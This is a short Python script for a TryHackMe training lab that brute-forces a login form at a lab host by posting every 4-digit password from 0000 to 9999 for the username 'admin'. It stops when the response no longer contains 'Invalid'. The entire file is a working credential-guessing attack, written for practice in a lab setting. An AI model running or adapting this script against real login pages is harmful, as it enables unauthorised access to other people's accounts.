# This script is for brute-force attack on a login page to find the right password.
# It was made based on the lesson "Custom tooling using python" from tryhackme.com.
# The program tries all 4-digit passwords from 0000 to 9999 for the username "admin".

import requests  # We import requests library to send HTTP requests.

url = "http://python.thm/labs/lab1/index.php"  # This is the URL of the login page we target.

username = "admin"  # The username we try to login with.

# Generating 4-digit numeric passwords (0000-9999)
# Here we create a list of all possible 4-digit codes with leading zeros.
password_list = [str(i).zfill(4) for i in range(10000)]

def brute_force():  # This function does the brute-force attack.
    for password in password_list:  # Loop through each password in the list.
        data = {"username": username, "password": password}  # Prepare the data for POST request.
        response = requests.post(url, data=data)  # Send the login attempt.
        
        if "Invalid" not in response.text:  # Check if the response doesn't say "Invalid".
            print(f"[+] Found valid credentials: {username}:{password}")  # If good, print the credentials.
            break  # Stop the loop when we find the right one.
        else:
            print(f"[-] Attempted: {password}")  # If not, print the tried password.

brute_force()  # Call the function to start the attack.
